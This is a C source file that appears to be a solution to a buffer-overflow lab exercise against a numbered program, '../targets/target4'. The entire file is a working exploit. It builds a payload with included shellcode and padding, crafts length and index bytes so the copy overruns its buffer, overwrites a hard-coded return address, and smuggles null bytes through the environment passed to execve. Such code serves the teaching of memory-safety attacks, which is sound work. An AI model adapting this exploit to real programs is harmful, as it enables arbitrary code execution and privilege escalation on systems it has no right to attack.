#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
	char *args[3];
	char *env[6];

	args[0] = TARGET; 
	char exploit[188];
	int i = 0;
	strcpy(exploit, shellcode);
	for (i = 45; i < 188; i++) {
		exploit[i] = 0x01;
	}
	exploit[168] = 0xBB; // 187
	exploit[169] = 0x00;
	exploit[170] = 0x00;
	exploit[171] = 0x00;
	exploit[172] = 0xAC; // 172
	exploit[173] = 0x00;
	exploit[174] = 0x00;
	exploit[175] = 0x00;
	int return_add = 0x02021fdb0;
	int* ret_in_exploit = (int*) (exploit + 184);
	*ret_in_exploit = return_add;	
	
	args[1] = exploit;
	args[2] = NULL;
	env[0] = &exploit[170];
	env[1] = &exploit[171];
	env[2] = &exploit[172];
	env[3] = &exploit[174];
	env[4] = &exploit[175];
	env[5] = &exploit[176];

 	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");
	return 0;
}
